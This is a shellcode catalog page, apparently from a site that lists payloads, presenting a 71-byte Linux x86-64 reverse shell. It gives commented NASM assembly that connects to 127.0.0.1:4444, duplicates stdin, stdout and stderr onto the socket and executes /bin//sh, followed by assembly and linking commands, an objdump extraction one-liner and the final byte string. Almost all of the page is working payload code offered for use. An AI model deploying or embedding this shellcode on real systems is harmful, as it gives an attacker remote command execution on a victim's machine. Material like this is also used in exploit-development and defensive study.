---
layout: default
title: Pure Syscall Socket Reverse Shell (127.0.0.1:4444)
permalink: /shellcode/asm-24.html
os: Linux
arch: Intel x86-64
length: 71
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor rbx, rbx				; RBX = 0
	mul rbx					; RAX, RDX = 0

	; Socket
	mov al, 41				; RAX = 41 (socket syscall number)
	push byte 2
	pop rdi					; RDI = 2 (AF_INET)
	push byte 1
	pop rsi					; RSI = 1 (SOCK_STREAM)
	syscall					; Execute socket syscall

	; Connect
	xchg rax, rdi				; RAX = 2, RDI = socket fd
	mov al, 42				; RAX = 42 (connect syscall number)
	mov rcx, 0xfeffff80a3eefffe	        ; Packed addr:port (127.0.0.1:4444:AF_INET)
	neg rcx
	push rcx				; Push 127.0.0.1:4444:AF_INET
	push rsp				; Push pointer to 127.0.0.1:4444:AF_INET
	pop rsi					; RSI = pointer to 127.0.0.1:4444:AF_INET
	mov dl, 16				; Length of sockaddr (127.0.0.1:4444:AF_INET)
	syscall					; Execute connect syscall

	; Setup stdin, stdout, stderr file descriptors
	push byte 3
	pop rsi					; RSI = 3 (STDIN, STDOUT, STDERR = 2, 1, 0)

	dup_loop:
		mov al, 33			; RAX = 33 (dup2 syscall number)
		dec rsi				; Decrement RSI (2, 1, 0)
		syscall				; Execute dup2(RDI[socket fd], RSI[2, 1, 0]) syscall
	jnz dup_loop			        ; Jump to dup_loop if not zero

	; Execve
	cdq				        ; RDX = 0
	mov al, 59				; RAX = 59 (execve syscall number)
	push rdx				; Push 0
	mov rcx, 0x68732f2f6e69622f	        ; RCX = '/bin//sh'
	push rcx				; Push '/bin//sh'
	push rsp				; Push pointer to '/bin//sh'
	pop rdi					; Pop pointer to '/bin//sh' into RDI
	syscall					; Execute execve syscall
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x48\x31\xdb\x48\xf7\xe3\xb0\x29\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\x48\xff\xce\x0f\x05\x75\xf7\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x0f\x05
```